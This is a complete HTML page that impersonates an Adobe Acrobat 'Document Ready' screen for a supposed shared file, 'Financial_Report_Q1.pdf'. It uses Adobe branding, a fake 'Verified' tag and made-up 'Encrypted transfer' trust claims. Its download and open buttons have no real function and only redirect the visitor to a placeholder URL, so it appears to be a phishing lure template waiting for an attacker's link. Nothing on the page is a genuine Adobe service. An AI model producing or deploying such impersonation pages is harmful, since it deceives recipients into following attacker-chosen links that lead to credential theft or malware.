<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Acrobat - Document Ready</title>
    <link rel="icon" href="https://www.adobe.com/favicon.ico">
    <style>
        @page { size: A4; margin: 0; }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: adobe-clean, 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .header {
            background: #ffffff;
            border-bottom: 1px solid #e8e8e8;
            padding: 14px 28px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .header-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .header-brand svg {
            width: 28px;
            height: 24px;
        }

        .header-title {
            font-size: 16px;
            font-weight: 700;
            color: #2c2c2c;
        }

        .header-title span {
            color: #EB1000;
        }

        /* Main */
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 48px 20px;
        }

        .panel {
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 2px 24px rgba(0, 0, 0, 0.06);
            max-width: 560px;
            width: 100%;
            overflow: hidden;
        }

        /* Document preview area */
        .preview-area {
            background: #fafafa;
            padding: 36px;
            border-bottom: 1px solid #eeeeee;
            display: flex;
            gap: 24px;
        }

        .preview-thumbnail {
            width: 140px;
            height: 180px;
            flex-shrink: 0;
            background: #ffffff;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 16px 14px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .preview-thumbnail .pline {
            height: 6px;
            background: #e8e8e8;
            border-radius: 3px;
        }

        .preview-thumbnail .pline.head {
            height: 8px;
            width: 55%;
            background: #d0d0d0;
            margin-bottom: 4px;
        }

        .preview-thumbnail .pline.w90 { width: 90%; }
        .preview-thumbnail .pline.w80 { width: 80%; }
        .preview-thumbnail .pline.w70 { width: 70%; }
        .preview-thumbnail .pline.w95 { width: 95%; }

        .preview-info {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .preview-info h2 {
            font-size: 18px;
            font-weight: 700;
            color: #2c2c2c;
            margin-bottom: 6px;
            word-break: break-word;
        }

        .preview-info .shared-by {
            font-size: 13px;
            color: #6e6e6e;
            margin-bottom: 16px;
        }

        .tag-row {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        .tag {
            font-size: 11px;
            font-weight: 600;
            padding: 4px 10px;
            border-radius: 10px;
            white-space: nowrap;
        }

        .tag.pdf {
            background: #fff0ef;
            color: #EB1000;
        }

        .tag.secure {
            background: #e8f5e9;
            color: #2e7d32;
        }

        .tag.pages {
            background: #f3f4f6;
            color: #4b5563;
        }

        /* Details */
        .details {
            padding: 28px 36px;
        }

        .detail-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-bottom: 28px;
        }

        .detail-item {
            padding: 14px 16px;
            background: #fafafa;
            border-radius: 10px;
        }

        .detail-label {
            font-size: 11px;
            color: #8a8a8a;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            margin-bottom: 4px;
        }

        .detail-value {
            font-size: 15px;
            font-weight: 600;
            color: #2c2c2c;
        }

        /* Buttons */
        .action-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .btn-primary {
            width: 100%;
            background: #EB1000;
            color: #ffffff;
            border: none;
            border-radius: 24px;
            padding: 15px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background 0.2s ease, box-shadow 0.2s ease;
            text-decoration: none;
        }

        .btn-primary:hover {
            background: #c40d00;
            box-shadow: 0 4px 16px rgba(235, 16, 0, 0.2);
        }

        .btn-primary svg {
            width: 18px;
            height: 18px;
        }

        .btn-outline {
            width: 100%;
            background: transparent;
            color: #2c2c2c;
            border: 1.5px solid #d0d0d0;
            border-radius: 24px;
            padding: 13px 24px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s ease;
            text-decoration: none;
        }

        .btn-outline:hover {
            border-color: #EB1000;
            color: #EB1000;
            background: #fff5f4;
        }

        .btn-outline svg {
            width: 16px;
            height: 16px;
        }

        .trust-line {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 18px;
            font-size: 11px;
            color: #b3b3b3;
        }

        .trust-line svg {
            width: 13px;
            height: 13px;
            fill: #4caf50;
        }

        /* Footer */
        .footer {
            padding: 18px;
            text-align: center;
            font-size: 11px;
            color: #b3b3b3;
        }

        .footer a { color: #b3b3b3; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }

        /* Print / PDF styles */
        @media print {
            body { background: #ffffff; }
            .panel { box-shadow: none; border: 1px solid #e0e0e0; }
            .btn-primary, .btn-outline, .preview-area, .detail-item, .tag {
                -webkit-print-color-adjust: exact;
                print-color-adjust: exact;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="header-brand">
            <svg viewBox="0 0 30 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
            </svg>
            <div class="header-title">Adobe <span>Acrobat</span></div>
        </div>
    </div>

    <!-- Main -->
    <div class="main">
        <div class="panel">
            <!-- Preview area -->
            <div class="preview-area">
                <div class="preview-thumbnail">
                    <div class="pline head"></div>
                    <div class="pline w95"></div>
                    <div class="pline w90"></div>
                    <div class="pline w80"></div>
                    <div class="pline w95"></div>
                    <div class="pline w70"></div>
                    <div style="height:6px"></div>
                    <div class="pline head" style="width:40%"></div>
                    <div class="pline w90"></div>
                    <div class="pline w80"></div>
                    <div class="pline w95"></div>
                </div>
                <div class="preview-info">
                    <h2>Financial_Report_Q1.pdf</h2>
                    <div class="shared-by">Shared via Adobe Document Cloud</div>
                    <div class="tag-row">
                        <span class="tag pdf">PDF</span>
                        <span class="tag secure">Verified</span>
                        <span class="tag pages">14 pages</span>
                    </div>
                </div>
            </div>

            <!-- Details -->
            <div class="details">
                <div class="detail-grid">
                    <div class="detail-item">
                        <div class="detail-label">File Size</div>
                        <div class="detail-value">4.2 MB</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">Format</div>
                        <div class="detail-value">PDF 1.7</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">Created</div>
                        <div class="detail-value">Apr 14, 2026</div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">Protection</div>
                        <div class="detail-value">Encrypted</div>
                    </div>
                </div>

                <div class="action-group">
                    <button class="btn-primary" onclick="handleAction()">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                            <polyline points="7 10 12 15 17 10"/>
                            <line x1="12" y1="15" x2="12" y2="3"/>
                        </svg>
                        Download PDF
                    </button>
                    <button class="btn-outline" onclick="handleAction()">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/>
                            <polyline points="15 3 21 3 21 9"/>
                            <line x1="10" y1="14" x2="21" y2="3"/>
                        </svg>
                        Open in Adobe Acrobat
                    </button>
                </div>

                <div class="trust-line">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    Adobe verified &middot; Encrypted transfer
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        &copy; 2026 Adobe. All rights reserved. &middot;
        <a href="#">Privacy</a> &middot;
        <a href="#">Terms of Use</a>
    </div>

    <script>
        function handleAction() {
            window.location.href = 'REDIRECT_URL_HERE';
        }
    </script>
</body>
</html>
